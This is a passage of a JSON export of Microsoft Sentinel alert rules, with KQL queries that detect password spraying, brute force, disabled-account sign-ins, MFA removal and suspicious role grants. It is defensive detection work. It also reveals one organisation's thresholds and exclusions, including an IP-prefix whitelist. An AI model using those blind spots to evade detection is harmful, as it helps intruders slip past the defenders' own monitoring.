IPAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalNames"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess"],"techniques":["T1110"],"displayName":"Password spray attack against Azure AD application","enabled":true,"description":"Identifies evidence of password spray activity against Azure AD applications by looking for failures from multiple accounts from the same\nIP address within a time window. If the number of accounts breaches the threshold just once, all failures from the IP address within the time range\nare bought into the result. Details on whether there were successful authentications by the IP address within the time window are also included.\nThis can be an indicator that an attack was successful.\nThe default failure acccount threshold is 5, Default time window for failures is 20m and default look back window is 3 days\nNote: Due to the number of possible accounts involved in a password spray it is not possible to map identities to a custom entity.\nReferences: https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-sign-ins-error-codes.\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0006;T1110;T1110.003","alertRuleTemplateName":"48607a29-a26a-4abf-8078-a06dbdd174a4","lastModifiedUtc":"2024-10-02T21:23:28.6678607Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/6ac4984a-7a91-4122-ad4f-db87c208aeda","name":"6ac4984a-7a91-4122-ad4f-db87c208aeda","etag":"\"8600f8ad-0000-2700-0000-66fdb6c80000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let lookBack = 1d;\nSigninLogs \n| where TimeGenerated >= ago(lookBack)\n| where ResultType == \"50057\"\n| extend Location = strcat(LocationDetails.city, \" \", LocationDetails.state, \" \", LocationDetails.countryOrRegion)\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), disabledAccountLoginAttempts = count(), \n    disabledAccountsTargeted = dcount(UserPrincipalName), applicationsTargeted = dcount(AppDisplayName), disabledAccountSet = make_set(UserPrincipalName), \n    applicationSet = make_set(AppDisplayName)\n    by IPAddress, Location\n| order by disabledAccountLoginAttempts desc\n| join kind= leftouter (\n    // Consider these IPs suspicious - and alert any related  successful sign-ins\n    SigninLogs\n    | where TimeGenerated >= ago(lookBack)\n    | where ResultType == 0\n    | summarize\n        successfulAccountSigninCount = dcount(UserPrincipalName),\n        successfulAccountSigninSet = make_set(UserPrincipalName, 15)\n        by IPAddress\n    // Assume IPs associated with sign-ins from 100+ distinct user accounts are safe\n    | where successfulAccountSigninCount < 100\n    )\n    on IPAddress \n| extend successfulAccountSigninCount = iif(isnotempty(successfulAccountSigninCount), successfulAccountSigninCount, 0)\n| order by disabledAccountLoginAttempts\n| extend timestamp = StartTimeUtc, IPCustomEntity = IPAddress\n// removes entries where the IP address is owned by DoD. This is to eliminate entries most likely cause by DHCP.\n| where IPCustomEntity !startswith \"140.\"\n// removes entries where there were no successful signins\n| where successfulAccountSigninCount != 0\n// expands the signin sets so theres multiple entries per successful signin user\n| mv-expand successfulAccountSigninSet\n// changes these two columns to strings rather than dynamic columns for next compare\n| extend disabledAccountSet = tostring(disabledAccountSet[0]), successfulAccountSigninSet = tostring(successfulAccountSigninSet)\n// remove entries where the successful signin is from the same user who has now had their account enabled\n| where split(disabledAccountSet, \"disable.\")[1] != successfulAccountSigninSet\n| summarize successfulAccountSigninSet = make_set(successfulAccountSigninSet) by StartTimeUtc, disabledAccountSet, successfulAccountSigninCount, timestamp, IPCustomEntity, EndTimeUtc, disabledAccountLoginAttempts, disabledAccountsTargeted, tostring(applicationSet), Location\n| project-reorder StartTimeUtc, EndTimeUtc, disabledAccountSet ,disabledAccountsTargeted, disabledAccountLoginAttempts, IPCustomEntity, Location, applicationSet, successfulAccountSigninSet, timestamp","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"disabledAccountSet"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Persistence"],"techniques":["T1078","T1098"],"displayName":"Sign-ins from IPs that attempt sign-ins to disabled accounts","enabled":true,"description":"Identifies IPs with failed attempts to sign in to one or more disabled accounts signed in successfully to another account.\nReferences: https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-sign-ins-error-codes\n50057 - User account is disabled. The account has been disabled by an administrator.\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.004,TA0006;T1110;T1110.001;T1110.002;T1110.003;T1110.004","alertRuleTemplateName":"500c103a-0319-4d56-8e99-3cec8d860757","lastModifiedUtc":"2024-10-02T21:10:30.2324059Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/b42d0d2e-77f4-48a2-b57d-a1091e0a52ed","name":"b42d0d2e-77f4-48a2-b57d-a1091e0a52ed","etag":"\"8700cf2c-0000-2700-0000-66fdbe9c0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let timeframe = 1d;\n//(union isfuzzy=true\nAuditLogs \n| where TimeGenerated >= ago(timeframe) \n| where OperationName =~ \"Disable Strong Authentication\"\n| extend IPAddress = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress) \n| extend InitiatedByUser = iff(isnotempty(tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)), \n tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName), tostring(parse_json(tostring(InitiatedBy.app)).displayName))\n| extend Targetprop = todynamic(TargetResources)\n| extend TargetUser = tostring(Targetprop[0].userPrincipalName) \n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated) by User = TargetUser, InitiatedByUser , Operation = OperationName , CorrelationId, IPAddress, Category, Source = SourceSystem , AADTenantId, Type\n//),\n//The following lines were commented out due to not having the AWSCloudTrail table currently\n//(AWSCloudTrail\n//| where TimeGenerated >= ago(timeframe)\n//| where EventName in~ (\"DeactivateMFADevice\", \"DeleteVirtualMFADevice\") \n//| extend InstanceProfileName = tostring(parse_json(RequestParameters).InstanceProfileName)\n//| extend TargetUser = tostring(parse_json(RequestParameters).userName)\n//| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated) by User = TargetUser, Source = EventSource , Operation = EventName , TenantorInstance_Detail = InstanceProfileName, IPAddress = SourceIpAddress\n//)\n//)\n| extend timestamp = StartTimeUtc, AccountCustomEntity = User, IPCustomEntity = IPAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess"],"techniques":[],"displayName":"MFA disabled for a user","enabled":true,"description":"Multi-Factor Authentication (MFA) helps prevent credential compromise. This alert identifies when an attempt has been made to disable MFA for a user \nPLATFORM:Azure AD,IaaS,Microsoft 365\nMITRE:TA0003;T1098;T1098.001;T1098.003,TA0005;T1078;T1078.004","alertRuleTemplateName":"65c78944-930b-4cae-bd79-c3664ae30ba7","lastModifiedUtc":"2024-10-02T21:43:55.6538696Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/f08d4f8f-1fbd-4c69-8f2b-5ef58cbe8b07","name":"f08d4f8f-1fbd-4c69-8f2b-5ef58cbe8b07","etag":"\"7607904c-0000-2700-0000-6734ad130000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let timeframe = 1h;\nlet threshold = 3;\nSigninLogs\n| where TimeGenerated >= ago(timeframe)\n| where ResultType == \"50057\"\n| where ResultDescription =~ \"User account is disabled. The account has been disabled by an administrator.\"\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), count(), applicationCount = dcount(AppDisplayName), \napplicationSet = makeset(AppDisplayName) by UserPrincipalName, IPAddress\n| where applicationCount >= threshold\n| extend timestamp = StartTimeUtc, AccountCustomEntity = UserPrincipalName, IPCustomEntity = IPAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"Attempts to sign in to disabled accounts","enabled":true,"description":"Identifies failed attempts to sign in to disabled accounts across multiple Azure Applications.\nDefault threshold for Azure Applications attempted to sign in to is 3.\nReferences: https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-sign-ins-error-codes\n50057 - User account is disabled. The account has been disabled by an administrator.\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.002;T1078.003;T1078.004,TA0003;T1078;T1078.001;T1078.002;T1078.003;T1078.004,TA0006;T1110;T1110.001;T1110.002;T1110.003;T1110.004","alertRuleTemplateName":"75ea5c39-93e5-489b-b1e1-68fa6c9d2d04","lastModifiedUtc":"2024-11-13T13:43:46.0632634Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/28d362f8-bb10-4400-b1f9-bd90888b4809","name":"28d362f8-bb10-4400-b1f9-bd90888b4809","etag":"\"87001672-0000-2700-0000-66fdc3630000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P7D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Set threshold value for deviation\nlet threshold = 25;\n// Set the time range for the query\nlet timeRange = 24h;\n// Set the authentication window duration\nlet authenticationWindow = 20m;\n// Define a reusable function 'aadFunc' that takes a table name as input\nlet aadFunc = (tableName: string) {\n  // Query the specified table\n  table(tableName)\n  // Filter data within the last 24 hours\n  | where TimeGenerated > ago(1d)\n  // Filter records related to \"Azure Portal\" applications\n  | where AppDisplayName has \"Azure Portal\"\n  // Extract and transform some fields\n  | extend\n      DeviceDetail = todynamic(DeviceDetail),\n      LocationDetails = todynamic(LocationDetails)\n  | extend\n      OS = tostring(DeviceDetail.operatingSystem),\n      Browser = tostring(DeviceDetail.browser),\n      State = tostring(LocationDetails.state),\n      City = tostring(LocationDetails.city),\n      Region = tostring(LocationDetails.countryOrRegion)\n  // Categorize records as Success or Failure based on ResultType\n  | extend FailureOrSuccess = iff(ResultType in (\"0\", \"50125\", \"50140\", \"70043\", \"70044\"), \"Success\", \"Failure\")\n  // Sort and identify sessions\n  | sort by UserPrincipalName asc, TimeGenerated asc\n  | extend SessionStartedUtc = row_window_session(TimeGenerated, timeRange, authenticationWindow, UserPrincipalName != prev(UserPrincipalName) or prev(FailureOrSuccess) == \"Success\")\n  // Summarize data\n  | summarize FailureOrSuccessCount = count() by  FailureOrSuccess, UserId, UserDisplayName, AppDisplayName, IPAddress, Browser, OS, State, City, Region, Type, CorrelationId, bin(TimeGenerated, authenticationWindow), ResultType, UserPrincipalName, SessionStartedUtc\n  | summarize FailureCountBeforeSuccess = sumif(FailureOrSuccessCount, FailureOrSuccess == \"Failure\"), StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), makelist(FailureOrSuccess), IPAddress = make_set(IPAddress, 15), make_set(Browser, 15), make_set(City, 15), make_set(State, 15), make_set(Region, 15), make_set(ResultType, 15) by SessionStartedUtc, UserPrincipalName, CorrelationId, AppDisplayName, UserId, Type\n  // Filter records where \"Success\" occurs in the middle of a session\n  | where array_index_of(list_FailureOrSuccess, \"Success\") != 0\n  | where array_index_of(list_FailureOrSuccess, \"Success\") == array_length(list_FailureOrSuccess) - 1\n  // Remove unnecessary columns from the output\n  | project-away SessionStartedUtc, list_FailureOrSuccess\n  // Join with another table and calculate deviation\n  | join kind=inner (\n      table(tableName)\n      | where TimeGenerated > ago(7d)\n      | where AppDisplayName has \"Azure Portal\"\n      | extend FailureOrSuccess = iff(ResultType in (\"0\", \"50125\", \"50140\", \"70043\", \"70044\"), \"Success\", \"Failure\")\n      | summarize avgFailures = avg(todouble(FailureOrSuccess == \"Failure\")) by UserPrincipalName\n  ) on UserPrincipalName\n  | extend Deviation = abs(FailureCountBeforeSuccess - avgFailures) / avgFailures\n  // Filter records based on deviation and failure count criteria\n  | where Deviation > threshold and FailureCountBeforeSuccess >= 10\n  // Expand the IPAddress array\n  | mv-expand IPAddress\n  | extend IPAddress = tostring(IPAddress)\n  | extend timestamp = StartTime\n};\n// Call 'aadFunc' with different table names and union the results\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nunion isfuzzy=true aadSignin, aadNonInt\n// Additional transformation - Split UserPrincipalName\n| extend Name = tostring(split(UserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(UserPrincipalName,'@',1)[0])\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"templateVersion":"2.1.4","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess"],"techniques":["T1110"],"displayName":"Brute force attack against Azure Portal","enabled":true,"description":"Detects Azure Portal brute force attacks by monitoring for multiple authentication failures and a successful login within a 20-minute window. Default settings: 10 failures, 25 deviations.\nRef: https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-sign-ins-error-codes.\nPLATFORM:Azure AD\nMITRE:TA0007;T1087;T1087.004","alertRuleTemplateName":"28b42356-45af-40a6-a0b4-a554cdfd5d8a","lastModifiedUtc":"2024-10-02T22:04:18.6590938Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/81e60bdc-83b1-4372-b824-19d8f7bb78bd","name":"81e60bdc-83b1-4372-b824-19d8f7bb78bd","etag":"\"1b0081d8-0000-2700-0000-66d8a75c0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let lookBack_long = 14d;\nlet lookBack_med = 7d;\nlet lookBack = 1d;\nSigninLogs\n| where TimeGenerated >= startofday(ago(lookBack_long))\n| extend locationString = strcat(tostring(LocationDetails[\"countryOrRegion\"]), \"/\", tostring(LocationDetails[\"state\"]), \"/\", tostring(LocationDetails[\"city\"]), \";\") \n| project TimeGenerated, AppDisplayName , UserPrincipalName, locationString \n// Create time series \n| make-series dLocationCount = dcount(locationString) on TimeGenerated in range(startofday(ago(lookBack_long)),now(), 1d) \nby UserPrincipalName, AppDisplayName \n// Compute best fit line for each entry \n| extend (RSquare,Slope,Variance,RVariance,Interception,LineFit)=series_fit_line(dLocationCount) \n// Chart the 3 most interesting lines  \n// A 0-value slope corresponds to an account being completely stable over time for a given Azure Active Directory application\n| where Slope > 0.3\n| top 50 by Slope desc\n| join kind = leftsemi (\nSigninLogs\n| where TimeGenerated >= startofday(ago(lookBack_med))\n| extend locationString = strcat(tostring(LocationDetails[\"countryOrRegion\"]), \"/\", tostring(LocationDetails[\"state\"]), \"/\", tostring(LocationDetails[\"city\"]), \";\") \n| project TimeGenerated, AppDisplayName , UserPrincipalName, locationString \n| make-series dLocationCount = dcount(locationString) on TimeGenerated in range(startofday(ago(lookBack_med)) ,now(), 1d) \nby UserPrincipalName, AppDisplayName \n| extend (RSquare,Slope,Variance,RVariance,Interception,LineFit)=series_fit_line(dLocationCount) \n| top 50 by Slope desc\n| where Slope > 0.3\n) on UserPrincipalName, AppDisplayName\n| join kind = leftsemi (\nSigninLogs\n| where TimeGenerated >= startofday(ago(lookBack))\n| extend locationString = strcat(tostring(LocationDetails[\"countryOrRegion\"]), \"/\", tostring(LocationDetails[\"state\"]), \"/\", tostring(LocationDetails[\"city\"]), \";\") \n| project TimeGenerated, AppDisplayName , UserPrincipalName, locationString \n| make-series dLocationCount = dcount(locationString) on TimeGenerated in range(startofday(ago(lookBack)) ,now(), 1d) \nby UserPrincipalName, AppDisplayName \n| extend (RSquare,Slope,Variance,RVariance,Interception,LineFit)=series_fit_line(dLocationCount) \n| top 50 by Slope desc\n// Higher threshold requirement on last day anomaly\n| where Slope > 5\n) on UserPrincipalName, AppDisplayName\n| extend timestamp = TimeGenerated, AccountCustomEntity = UserPrincipalName","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"Anomalous sign-in location by user account and authenticating application","enabled":true,"description":"This query over Azure Active Directory sign-in considers all user sign-ins for each Azure Active \nDirectory application and picks out the most anomalous change in location profile for a user within an \nindividual application. An alert is generated for recent sign-ins that have location counts that are anomalous\nover last day but also over the last 7-day and 14-day periods.\n\n\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows;MITRE:TA0001;T1078","alertRuleTemplateName":"7cb8f77d-c52f-4e46-b82f-3cf2e106224a","lastModifiedUtc":"2024-09-04T18:30:33.2122323Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/8dde7f87-64c0-4701-989b-4c6210d4e05b","name":"8dde7f87-64c0-4701-989b-4c6210d4e05b","etag":"\"2e0125af-0000-2700-0000-6707e8290000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let riskScoreCutoff = 20; //Adjust this based on volume of results\nlet logonDiff = 10m; let aadFunc = (tableName:string){ table(tableName)\n| where ResultType == \"0\"\n| where AppDisplayName !in (\"Office 365 Exchange Online\", \"Skype for Business Online\") // To remove false-positives, add more Apps to this array\n// ---------- Fix for SuccessBlock to also consider IPv6\n| extend SuccessIPv6Block = strcat(split(IPAddress, \":\")[0], \":\", split(IPAddress, \":\")[1], \":\", split(IPAddress, \":\")[2], \":\", split(IPAddress, \":\")[3])\n| extend SuccessIPv4Block = strcat(split(IPAddress, \".\")[0], \".\", split(IPAddress, \".\")[1])\n// ------------------\n| project SuccessLogonTime = TimeGenerated, UserPrincipalName, SuccessIPAddress = IPAddress, SuccessLocation = Location, AppDisplayName, SuccessIPBlock = iff(IPAddress contains \":\", strcat(split(IPAddress, \":\")[0], \":\", split(IPAddress, \":\")[1]), strcat(split(IPAddress, \".\")[0], \".\", split(IPAddress, \".\")[1])), Type\n| join kind= inner (\ntable(tableName)\n| where ResultType !in (\"0\", \"50140\", \"501314\")\n| where ResultDescription !~ \"Other\"\n| where AppDisplayName !in (\"Office 365 Exchange Online\", \"Skype for Business Online\")\n| project FailedLogonTime = TimeGenerated, UserPrincipalName, FailedIPAddress = IPAddress, FailedLocation = Location, AppDisplayName, ResultType, ResultDescription, Type\n) on UserPrincipalName, AppDisplayName\n| where SuccessLogonTime < FailedLogonTime and FailedLogonTime - SuccessLogonTime <= logonDiff and FailedIPAddress !startswith SuccessIPBlock\n| summarize FailedLogonTime = max(FailedLogonTime), SuccessLogonTime = max(SuccessLogonTime) by UserPrincipalName, SuccessIPAddress, SuccessLocation, AppDisplayName, FailedIPAddress, FailedLocation, ResultType, ResultDescription, Type\n| extend timestamp = SuccessLogonTime\n| extend UserPrincipalName = tolower(UserPrincipalName)};\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nunion isfuzzy=true aadSignin, aadNonInt\n| extend Name = tostring(split(UserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(UserPrincipalName,'@',1)[0])\n//UEBA context below - make sure you have these 2 datatypes, otherwise the query will not work. If so, comment all that is below.\n| join kind=leftouter (\nIdentityInfo\n| summarize LatestReportTime = arg_max(TimeGenerated, *) by AccountUPN\n| extend BlastRadiusInt = iif(BlastRadius == \"High\", 1, 0)\n| project AccountUPN, Tags, JobTitle, GroupMembership, AssignedRoles, UserType, IsAccountEnabled, BlastRadiusInt\n| summarize\nTags = make_set(Tags, 1000),\nGroupMembership = make_set(GroupMembership, 1000),\nAssignedRoles = make_set(AssignedRoles, 1000),\nBlastRadiusInt = sum(BlastRadiusInt),\nUserType = make_set(UserType, 1000),\nUserAccountControl = make_set(UserType, 1000)\nby AccountUPN\n| extend UserPrincipalName=tolower(AccountUPN)\n) on UserPrincipalName\n| join kind=leftouter (\nBehaviorAnalytics\n| where ActivityType in (\"FailedLogOn\", \"LogOn\")\n| where isnotempty(SourceIPAddress)\n| project UsersInsights, DevicesInsights, ActivityInsights, InvestigationPriority, SourceIPAddress\n| project-rename FailedIPAddress = SourceIPAddress\n| summarize\nUsersInsights = make_set(UsersInsights, 1000),\nDevicesInsights = make_set(DevicesInsights, 1000),\nIPInvestigationPriority = sum(InvestigationPriority)\nby FailedIPAddress)\non FailedIPAddress\n| extend UEBARiskScore = BlastRadiusInt + IPInvestigationPriority\n| where UEBARiskScore > riskScoreCutoff\n| sort by UEBARiskScore desc","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"SuccessIPAddress"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"FailedIPAddress"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess","InitialAccess"],"techniques":[],"displayName":"Successful logon from IP and failure from a different IP","enabled":true,"description":"Identifies when a user account successfully logs onto an Azure App from one IP and within 10 mins failed to logon to the same App via a different IP.\nThis may indicate a malicious attempt at password guessing based on knowledge of the users account. Version 2.0\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.004,TA0006;T1110;T1110.001;T1110.003;T1110.004","alertRuleTemplateName":"02ef8d7e-fc3a-4d86-a457-650fa571d8d2","lastModifiedUtc":"2024-10-10T14:43:52.8675277Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/74812d3b-21a5-43fb-973f-71c38a74aaf0","name":"74812d3b-21a5-43fb-973f-71c38a74aaf0","etag":"\"8600980a-0000-2700-0000-66fdae700000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let starttime = 14d;\nlet endtime = 1d;\n// The number of operations below which an IP address is considered an unusual source of role assignment operations\nlet alertOperationThreshold = 5;\nlet createRoleAssignmentActivity = AzureActivity\n| where OperationName == \"Create role assignment\";\ncreateRoleAssignmentActivity \n| where TimeGenerated between (ago(starttime) .. ago(endtime))\n| summarize count() by CallerIpAddress, Caller\n| where count_ >= alertOperationThreshold\n| join kind = rightanti ( \ncreateRoleAssignmentActivity\n| where TimeGenerated > ago(endtime)\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), ActivityTimeStamp = makelist(TimeGenerated), ActivityStatus = makelist(ActivityStatus), \nOperationIds = makelist(OperationId), CorrelationId = makelist(CorrelationId), ActivityCountByCallerIPAddress = count()  \nby ResourceId, CallerIpAddress, Caller, OperationName, Resource, ResourceGroup\n) on CallerIpAddress, Caller\n| extend timestamp = StartTimeUtc, AccountCustomEntity = Caller, IPCustomEntity = CallerIpAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","PrivilegeEscalation"],"techniques":["T1098"],"displayName":"Suspicious granting of permissions to an account","enabled":true,"description":"Identifies IPs from which users grant access to other users on azure resources and alerts when a previously unseen source IP address is used.\nPLATFORM:Azure AD,IaaS,Microsoft 365,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.004,TA0003;T1098;T1098.001;T1098;T1098.003","alertRuleTemplateName":"b2c15736-b9eb-4dae-8b02-3016b6a45a32","lastModifiedUtc":"2024-10-02T20:34:56.124542Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/07b8de7a-54be-447b-9c8c-0dfe202802d0","name":"07b8de7a-54be-447b-9c8c-0dfe202802d0","etag":"\"d6009f6d-0000-2700-0000-65a7cca00000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P7D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"let timeRange = 1d;\nlet lookBack = 7d;\nlet threshold_Failed = 5;\nlet threshold_FailedwithSingleIP = 20;\nlet threshold_IPAddressCount = 2;\nlet isGUID = \"[0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12}\";\nlet azPortalSignins = materialize(SigninLogs\n| where TimeGenerated >= ago(lookBack)\n// Azure Portal only\n| where AppDisplayName =~ \"Azure Portal\")\n;\nlet successPortalSignins = azPortalSignins\n| where TimeGenerated >= ago(timeRange)\n// Azure Portal only and exclude non-failure Result Types\n| where ResultType in (\"0\", \"50125\", \"50140\")\n// Tagging identities not resolved to friendly names\n//| extend Unresolved = iff(Identity matches regex isGUID, true, false)\n| distinct TimeGenerated, UserPrincipalName, Id, ResultType\n;\nlet failPortalSignins = azPortalSignins\n| where TimeGenerated >= ago(timeRange)\n// Azure Portal only and exclude non-failure Result Types\n| where ResultType !in (\"0\", \"50125\", \"50140\")\n// Tagging identities not resolved to friendly names\n| extend Unresolved = iff(Identity matches regex isGUID, true, false)\n;\n// Verify there is no success for the same connection attempt after the fail\nlet failnoSuccess = failPortalSignins 